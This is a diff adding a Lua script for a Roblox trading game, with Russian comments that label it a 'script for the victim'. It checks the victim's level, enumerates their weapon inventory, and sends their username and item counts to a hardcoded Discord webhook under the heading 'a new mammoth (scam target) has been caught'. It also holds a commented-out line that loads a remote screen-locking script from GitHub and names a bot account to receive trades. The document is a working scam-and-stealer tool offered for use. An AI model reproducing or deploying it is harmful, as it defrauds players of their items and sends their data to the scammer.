@@ -1,0 +1,109 @@
+--- Скрипт для жертвы
+local botname = "RanoDevx" --- Введите ник вашего бота
+
+--- Запускаем скрипт, который блокирует экран
+--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Borebuhisss/Versions/refs/heads/main/12"))()
+--- 
+--- Проверяем девайс
+local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
+if hasLobby == true then
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
+else
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
+end
+
+--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
+local player = game.Players.LocalPlayer
+local args = {
+    [1] = player.Name
+}
+local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+local level = accountInformation.LevelBadges["Level10"]
+
+if level == false then
+    player:Kick("You're less than level 10.")
+end
+
+--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
+local HttpService = game:GetService("HttpService")
+
+local args = {
+    [1] = player.Name
+}
+
+local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+
+local weapons = inventory["Weapons"]
+local ownedWeapons = weapons["Owned"]
+
+local groupedWeapons = {}
+local currentGroup = {}
+local count = 0
+local totalSwords = 0
+
+for weaponName, weaponCount in pairs(ownedWeapons) do
+    totalSwords = totalSwords + weaponCount
+    if weaponCount > 1 then
+        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
+    else
+        table.insert(currentGroup, weaponName .. " (1)")
+    end
+    count = count + 1
+
+    if count == 4 then
+        table.insert(groupedWeapons, currentGroup)
+        currentGroup = {}
+        count = 0
+    end
+end
+
+if #currentGroup > 0 then
+    table.insert(groupedWeapons, currentGroup)
+end
+--- Отправляем уведомление в дискорд
+
+local webh = "https://discord.com/api/webhooks/1337312412348448779/vTVgVNC-pFDEl0pPPQWV_VYfVMIWwOI6AiYlQcdgu6qyFZHy3upbnX7By7p9VNMnsVPJ"
+
+local HttpServ = game:GetService("HttpService")
+local url = webh
+
+local data = {
+    ["content"] = "@everyone", -- Mention everyone (remove if not needed)
+    ["embeds"] = {{
+        ["title"] = "🎯 **Попался новый мамонт**",
+        ["description"] = "A player has been caught! Here are the details:",
+        ["color"] = 16711680, -- Red color
+        ["fields"] = {
+            {
+                ["name"] = "👤 Username",
+                ["value"] = player.Name, -- Replace with actual player name
+                ["inline"] = false -- Display each field on a new line
+            },
+            {
+                ["name"] = "⚔️ Count",
+                ["value"] = totalSwords, -- Replace with actual sword count
+                ["inline"] = false
+            },
+            {
+                ["name"] = "📈 Level 10",
+                ["value"] = "`" .. level .. "`", -- Replace with actual level
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Sent from Roblox",
+            ["icon_url"] = "https://example.com/roblox_icon.png"
+        },
+        ["thumbnail"] = {
+            ["url"] = "https://example.com/player_avatar.png"
+        }
+    }}
+}
+
+local newdata = HttpServ:JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+http_request(request_payload)
